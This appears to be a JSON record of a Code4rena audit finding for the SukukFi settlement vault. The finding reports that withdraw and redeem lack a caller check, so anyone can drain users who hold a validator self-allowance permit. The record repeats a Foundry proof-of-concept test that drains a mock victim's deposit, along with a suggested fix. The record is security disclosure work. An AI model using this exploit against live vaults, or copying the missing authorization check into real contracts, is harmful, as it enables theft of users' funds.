@@ -1,0 +1,122 @@
+{
+  "pairing": {
+    "match_status": "exact_submission",
+    "project": "SukukFi_syLyTBz5KNA",
+    "audit_uid": "syLyTBz5KNA",
+    "requested_submission_uid": "35X8HSswRc6",
+    "requested_finding_uid": "SZy2Ly7Y3Cu",
+    "source_kind": "pipeline_findings",
+    "source_path": "/root/sc_slicer_standalone/c4_pipeline_output/SukukFi_syLyTBz5KNA/20260618_141723/findings.json",
+    "source_submission_uid": "35X8HSswRc6",
+    "source_finding_uid": "SZy2Ly7Y3Cu",
+    "original_report_path": "SukukFi_syLyTBz5KNA\\high_valid_35X8HSswRc6.json",
+    "note": "The report is the exact submission paired with this contract."
+  },
+  "submission_uid": "35X8HSswRc6",
+  "finding_uid": "SZy2Ly7Y3Cu",
+  "finding_number": "3",
+  "title": "Settlement vault withdraw/redeem lack caller auth — anyone can drain self‑allowed users",
+  "severity": "high",
+  "validity": "valid",
+  "quality": "sufficient",
+  "user_handle": "niffylord",
+  "body": "## Summary\n`WERC7575Vault.withdraw` and `redeem` never check that `msg.sender` is the owner (or an approved delegate). They only spend the owner→owner self‑allowance required for normal withdrawals. Once a validator issues that self‑allowance permit, any address can call withdraw/redeem for that owner, burn the owner’s shares, and receive the underlying assets to an arbitrary receiver.\n\n## Impact\nFull theft of a user’s settlement assets after they obtain the required self‑allowance permit. Attacker burns the victim’s shares and transfers all assets to themselves; the victim is left with zero shares and zero assets.\n\n## Root Cause\n- `_withdraw` is invoked by both `withdraw` and `redeem` and only calls `_shareToken.spendSelfAllowance(owner, shares)` without verifying `msg.sender == owner` or spending an allowance for the caller. Permalinks: [withdraw helper](https://github.com/code-423n4/2025-11-sukukfi/blob/main/src/WERC7575Vault.sol#L397-L410), [withdraw entrypoint](https://github.com/code-423n4/2025-11-sukukfi/blob/main/src/WERC7575Vault.sol#L434-L437), [redeem entrypoint](https://github.com/code-423n4/2025-11-sukukfi/blob/main/src/WERC7575Vault.sol#L464-L467).\n- NatSpec comments claim “msg.sender must be owner OR have allowance” (e.g., lines 414‑452) but no such check exists in the code.",
+  "proof_of_concept": "Runnable PoC using the contest harness (no external tooling). Added test file: `test/H1_WERC7575VaultWithdrawAuth.t.sol`.\n\nKey steps:\n1) Deploy MockAsset, WERC7575ShareToken, WERC7575Vault; register vault and KYC Alice.\n2) Alice deposits 100 tokens into the settlement vault.\n3) Validator signs an owner==spender permit for Alice (self‑allowance), which is required for her own withdrawals.\n4) Attacker submits that permit and then calls `vault.withdraw(100 ether, attacker, alice)`, draining Alice.\n\nTest code (already in repo):\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.30;\n\nimport {Test} from \"forge-std/Test.sol\";\nimport {WERC7575ShareToken} from \"src/WERC7575ShareToken.sol\";\nimport {WERC7575Vault} from \"src/WERC7575Vault.sol\";\nimport {MockAsset} from \"test/MockAsset.sol\";\n\ncontract H1_WERC7575VaultWithdrawAuthTest is Test {\n    WERC7575ShareToken share;\n    WERC7575Vault vault;\n    MockAsset asset;\n\n    address validator = vm.addr(1);\n    uint256 validatorPk = 1;\n    address alice = vm.addr(2);\n    address attacker = vm.addr(3);\n\n    function setUp() public {\n        asset = new MockAsset();\n        share = new WERC7575ShareToken(\"Wrapped USD\", \"WUSD\");\n        vault = new WERC7575Vault(address(asset), share);\n\n        share.registerVault(address(asset), address(vault));\n        share.setValidator(validator);\n        share.setKycVerified(alice, true);\n\n        asset.mint(alice, 100 ether);\n        vm.startPrank(alice);\n        asset.approve(address(vault), type(uint256).max);\n        vault.deposit(100 ether, alice);\n        vm.stopPrank();\n    }\n\n    function test_anyoneCanWithdrawWithVictimSelfAllowance() public {\n        uint256 shares = share.balanceOf(alice);\n        uint256 nonce = share.nonces(alice);\n        uint256 deadline = block.timestamp + 1 days;\n\n        bytes32 permitTypehash = keccak256(\n            \"Permit(address owner,address spender,uint256 value,uint256 nonce,uint256 deadline)\"\n        );\n        bytes32 structHash = keccak256(abi.encode(permitTypehash, alice, alice, shares, nonce, deadline));\n        bytes32 digest = keccak256(abi.encodePacked(\"\\x19\\x01\", share.DOMAIN_SEPARATOR(), structHash));\n        (uint8 v, bytes32 r, bytes32 s) = vm.sign(validatorPk, digest);\n\n        vm.prank(attacker);\n        share.permit(alice, alice, shares, deadline, v, r, s);\n\n        vm.prank(attacker);\n        vault.withdraw(100 ether, attacker, alice);\n\n        assertEq(asset.balanceOf(attacker), 100 ether);\n        assertEq(share.balanceOf(alice), 0);\n    }\n}\n```\n\nRun:\n```\nforge test --match-test test_anyoneCanWithdrawWithVictimSelfAllowance\n```\nExpected: test passes; attacker receives Alice’s 100 tokens and Alice’s shares are burned.\n\n## Recommended Mitigation\nAdd caller authorization to `_withdraw` (used by both withdraw and redeem). Minimal pattern:\n```solidity\nif (msg.sender != owner) {\n    _shareToken.spendAllowance(owner, msg.sender, shares); // or revert if delegation is not desired\n}\n_shareToken.spendSelfAllowance(owner, shares); // keep validator gate\n```\nThis enforces owner-or-allowed-caller semantics while retaining the validator self‑allowance requirement.",
+  "lines_of_code": [
+    "https://github.com/code-423n4/2025-11-sukukfi/blob/main/src/WERC7575Vault.sol#L397-L410",
+    "https://github.com/code-423n4/2025-11-sukukfi/blob/main/src/WERC7575Vault.sol#L434-L437",
+    "https://github.com/code-423n4/2025-11-sukukfi/blob/main/src/WERC7575Vault.sol#L464-L467"
+  ],
+  "source_record": {
+    "project_id": "syLyTBz5KNA",
+    "submission_index": "71",
+    "api_submission_id": "",
+    "uid": "35X8HSswRc6",
+    "number": "71",
+    "title": "Settlement vault withdraw/redeem lack caller auth — anyone can drain self‑allowed users",
+    "severity": "high",
+    "validity": "valid",
+    "quality": "sufficient",
+    "handle": "niffylord",
+    "lines_of_code": [
+      "https://github.com/code-423n4/2025-11-sukukfi/blob/main/src/WERC7575Vault.sol#L397-L410",
+      "https://github.com/code-423n4/2025-11-sukukfi/blob/main/src/WERC7575Vault.sol#L434-L437",
+      "https://github.com/code-423n4/2025-11-sukukfi/blob/main/src/WERC7575Vault.sol#L464-L467"
+    ],
+    "body": "## Summary\n`WERC7575Vault.withdraw` and `redeem` never check that `msg.sender` is the owner (or an approved delegate). They only spend the owner→owner self‑allowance required for normal withdrawals. Once a validator issues that self‑allowance permit, any address can call withdraw/redeem for that owner, burn the owner’s shares, and receive the underlying assets to an arbitrary receiver.\n\n## Impact\nFull theft of a user’s settlement assets after they obtain the required self‑allowance permit. Attacker burns the victim’s shares and transfers all assets to themselves; the victim is left with zero shares and zero assets.\n\n## Root Cause\n- `_withdraw` is invoked by both `withdraw` and `redeem` and only calls `_shareToken.spendSelfAllowance(owner, shares)` without verifying `msg.sender == owner` or spending an allowance for the caller. Permalinks: [withdraw helper](https://github.com/code-423n4/2025-11-sukukfi/blob/main/src/WERC7575Vault.sol#L397-L410), [withdraw entrypoint](https://github.com/code-423n4/2025-11-sukukfi/blob/main/src/WERC7575Vault.sol#L434-L437), [redeem entrypoint](https://github.com/code-423n4/2025-11-sukukfi/blob/main/src/WERC7575Vault.sol#L464-L467).\n- NatSpec comments claim “msg.sender must be owner OR have allowance” (e.g., lines 414‑452) but no such check exists in the code.",
+    "proof_of_concept": "Runnable PoC using the contest harness (no external tooling). Added test file: `test/H1_WERC7575VaultWithdrawAuth.t.sol`.\n\nKey steps:\n1) Deploy MockAsset, WERC7575ShareToken, WERC7575Vault; register vault and KYC Alice.\n2) Alice deposits 100 tokens into the settlement vault.\n3) Validator signs an owner==spender permit for Alice (self‑allowance), which is required for her own withdrawals.\n4) Attacker submits that permit and then calls `vault.withdraw(100 ether, attacker, alice)`, draining Alice.\n\nTest code (already in repo):\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.30;\n\nimport {Test} from \"forge-std/Test.sol\";\nimport {WERC7575ShareToken} from \"src/WERC7575ShareToken.sol\";\nimport {WERC7575Vault} from \"src/WERC7575Vault.sol\";\nimport {MockAsset} from \"test/MockAsset.sol\";\n\ncontract H1_WERC7575VaultWithdrawAuthTest is Test {\n    WERC7575ShareToken share;\n    WERC7575Vault vault;\n    MockAsset asset;\n\n    address validator = vm.addr(1);\n    uint256 validatorPk = 1;\n    address alice = vm.addr(2);\n    address attacker = vm.addr(3);\n\n    function setUp() public {\n        asset = new MockAsset();\n        share = new WERC7575ShareToken(\"Wrapped USD\", \"WUSD\");\n        vault = new WERC7575Vault(address(asset), share);\n\n        share.registerVault(address(asset), address(vault));\n        share.setValidator(validator);\n        share.setKycVerified(alice, true);\n\n        asset.mint(alice, 100 ether);\n        vm.startPrank(alice);\n        asset.approve(address(vault), type(uint256).max);\n        vault.deposit(100 ether, alice);\n        vm.stopPrank();\n    }\n\n    function test_anyoneCanWithdrawWithVictimSelfAllowance() public {\n        uint256 shares = share.balanceOf(alice);\n        uint256 nonce = share.nonces(alice);\n        uint256 deadline = block.timestamp + 1 days;\n\n        bytes32 permitTypehash = keccak256(\n            \"Permit(address owner,address spender,uint256 value,uint256 nonce,uint256 deadline)\"\n        );\n        bytes32 structHash = keccak256(abi.encode(permitTypehash, alice, alice, shares, nonce, deadline));\n        bytes32 digest = keccak256(abi.encodePacked(\"\\x19\\x01\", share.DOMAIN_SEPARATOR(), structHash));\n        (uint8 v, bytes32 r, bytes32 s) = vm.sign(validatorPk, digest);\n\n        vm.prank(attacker);\n        share.permit(alice, alice, shares, deadline, v, r, s);\n\n        vm.prank(attacker);\n        vault.withdraw(100 ether, attacker, alice);\n\n        assertEq(asset.balanceOf(attacker), 100 ether);\n        assertEq(share.balanceOf(alice), 0);\n    }\n}\n```\n\nRun:\n```\nforge test --match-test test_anyoneCanWithdrawWithVictimSelfAllowance\n```\nExpected: test passes; attacker receives Alice’s 100 tokens and Alice’s shares are burned.\n\n## Recommended Mitigation\nAdd caller authorization to `_withdraw` (used by both withdraw and redeem). Minimal pattern:\n```solidity\nif (msg.sender != owner) {\n    _shareToken.spendAllowance(owner, msg.sender, shares); // or revert if delegation is not desired\n}\n_shareToken.spendSelfAllowance(owner, shares); // keep validator gate\n```\nThis enforces owner-or-allowed-caller semantics while retaining the validator self‑allowance requirement.",
+    "detail_url": "https://code4rena.com/api/v1/audits/syLyTBz5KNA/submissions/71",
+    "raw": {
+      "auditUid": "syLyTBz5KNA",
+      "createdAt": "2025-11-27T12:53:58.488Z",
+      "deletedAt": null,
+      "evaluations": [
+        {
+          "uid": "gUjbY72KaCt",
+          "userUid": "67uFCZeAHcw",
+          "userAuditRole": "judge",
+          "createdAt": "2025-11-30T09:03:15.694Z",
+          "type": "quality",
+          "value": "sufficient",
+          "submissionUid": "35X8HSswRc6",
+          "findingUid": null
+        },
+        {
+          "uid": "pgCCFrx2Aoj",
+          "userUid": "67uFCZeAHcw",
+          "userAuditRole": "judge",
+          "createdAt": "2025-12-23T03:29:13.852Z",
+          "type": "severity",
+          "value": "high",
+          "submissionUid": null,
+          "findingUid": "SZy2Ly7Y3Cu"
+        },
+        {
+          "uid": "mAwdhUhdkZC",
+          "userUid": "67uFCZeAHcw",
+          "userAuditRole": "judge",
+          "createdAt": "2026-01-27T23:03:48.397Z",
+          "type": "validity",
+          "value": "valid",
+          "submissionUid": null,
+          "findingUid": "SZy2Ly7Y3Cu"
+        }
+      ],
+      "finding": {
+        "uid": "SZy2Ly7Y3Cu",
+        "number": 3,
+        "duplicates": 164
+      },
+      "isPrimary": false,
+      "latestEvaluations": {
+        "credit": null,
+        "mitigationStatus": null,
+        "quality": "sufficient",
+        "rank": null,
+        "severity": "high",
+        "validity": "valid",
+        "updatedAt": "2026-02-03T19:20:37.287Z"
+      },
+      "mitigationOf": null,
+      "mitigationStatus": null,
+      "severity": "high",
+      "team": null,
+      "title": "Settlement vault withdraw/redeem lack caller auth — anyone can drain self‑allowed users",
+      "uid": "35X8HSswRc6",
+      "updatedAt": "2025-11-27T12:53:58.488Z",
+      "user": {
+        "uid": "vuuwxR7n6je",
+        "handle": "niffylord"
+      },
+      "sensitivity": "non-sensitive",
+      "aiSeverity": null,
+      "aiValidity": null,
+      "body": "## Summary\n`WERC7575Vault.withdraw` and `redeem` never check that `msg.sender` is the owner (or an approved delegate). They only spend the owner→owner self‑allowance required for normal withdrawals. Once a validator issues that self‑allowance permit, any address can call withdraw/redeem for that owner, burn the owner’s shares, and receive the underlying assets to an arbitrary receiver.\n\n## Impact\nFull theft of a user’s settlement assets after they obtain the required self‑allowance permit. Attacker burns the victim’s shares and transfers all assets to themselves; the victim is left with zero shares and zero assets.\n\n## Root Cause\n- `_withdraw` is invoked by both `withdraw` and `redeem` and only calls `_shareToken.spendSelfAllowance(owner, shares)` without verifying `msg.sender == owner` or spending an allowance for the caller. Permalinks: [withdraw helper](https://github.com/code-423n4/2025-11-sukukfi/blob/main/src/WERC7575Vault.sol#L397-L410), [withdraw entrypoint](https://github.com/code-423n4/2025-11-sukukfi/blob/main/src/WERC7575Vault.sol#L434-L437), [redeem entrypoint](https://github.com/code-423n4/2025-11-sukukfi/blob/main/src/WERC7575Vault.sol#L464-L467).\n- NatSpec comments claim “msg.sender must be owner OR have allowance” (e.g., lines 414‑452) but no such check exists in the code.",
+      "proofOfConcept": "Runnable PoC using the contest harness (no external tooling). Added test file: `test/H1_WERC7575VaultWithdrawAuth.t.sol`.\n\nKey steps:\n1) Deploy MockAsset, WERC7575ShareToken, WERC7575Vault; register vault and KYC Alice.\n2) Alice deposits 100 tokens into the settlement vault.\n3) Validator signs an owner==spender permit for Alice (self‑allowance), which is required for her own withdrawals.\n4) Attacker submits that permit and then calls `vault.withdraw(100 ether, attacker, alice)`, draining Alice.\n\nTest code (already in repo):\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.30;\n\nimport {Test} from \"forge-std/Test.sol\";\nimport {WERC7575ShareToken} from \"src/WERC7575ShareToken.sol\";\nimport {WERC7575Vault} from \"src/WERC7575Vault.sol\";\nimport {MockAsset} from \"test/MockAsset.sol\";\n\ncontract H1_WERC7575VaultWithdrawAuthTest is Test {\n    WERC7575ShareToken share;\n    WERC7575Vault vault;\n    MockAsset asset;\n\n    address validator = vm.addr(1);\n    uint256 validatorPk = 1;\n    address alice = vm.addr(2);\n    address attacker = vm.addr(3);\n\n    function setUp() public {\n        asset = new MockAsset();\n        share = new WERC7575ShareToken(\"Wrapped USD\", \"WUSD\");\n        vault = new WERC7575Vault(address(asset), share);\n\n        share.registerVault(address(asset), address(vault));\n        share.setValidator(validator);\n        share.setKycVerified(alice, true);\n\n        asset.mint(alice, 100 ether);\n        vm.startPrank(alice);\n        asset.approve(address(vault), type(uint256).max);\n        vault.deposit(100 ether, alice);\n        vm.stopPrank();\n    }\n\n    function test_anyoneCanWithdrawWithVictimSelfAllowance() public {\n        uint256 shares = share.balanceOf(alice);\n        uint256 nonce = share.nonces(alice);\n        uint256 deadline = block.timestamp + 1 days;\n\n        bytes32 permitTypehash = keccak256(\n            \"Permit(address owner,address spender,uint256 value,uint256 nonce,uint256 deadline)\"\n        );\n        bytes32 structHash = keccak256(abi.encode(permitTypehash, alice, alice, shares, nonce, deadline));\n        bytes32 digest = keccak256(abi.encodePacked(\"\\x19\\x01\", share.DOMAIN_SEPARATOR(), structHash));\n        (uint8 v, bytes32 r, bytes32 s) = vm.sign(validatorPk, digest);\n\n        vm.prank(attacker);\n        share.permit(alice, alice, shares, deadline, v, r, s);\n\n        vm.prank(attacker);\n        vault.withdraw(100 ether, attacker, alice);\n\n        assertEq(asset.balanceOf(attacker), 100 ether);\n        assertEq(share.balanceOf(alice), 0);\n    }\n}\n```\n\nRun:\n```\nforge test --match-test test_anyoneCanWithdrawWithVictimSelfAllowance\n```\nExpected: test passes; attacker receives Alice’s 100 tokens and Alice’s shares are burned.\n\n## Recommended Mitigation\nAdd caller authorization to `_withdraw` (used by both withdraw and redeem). Minimal pattern:\n```solidity\nif (msg.sender != owner) {\n    _shareToken.spendAllowance(owner, msg.sender, shares); // or revert if delegation is not desired\n}\n_shareToken.spendSelfAllowance(owner, shares); // keep validator gate\n```\nThis enforces owner-or-allowed-caller semantics while retaining the validator self‑allowance requirement.",
+      "linesOfCode": "https://github.com/code-423n4/2025-11-sukukfi/blob/main/src/WERC7575Vault.sol#L397-L410,https://github.com/code-423n4/2025-11-sukukfi/blob/main/src/WERC7575Vault.sol#L434-L437,https://github.com/code-423n4/2025-11-sukukfi/blob/main/src/WERC7575Vault.sol#L464-L467",
+      "number": 71,
+      "aiExplanation": null,
+      "_index": 71
+    }
+  }
+}
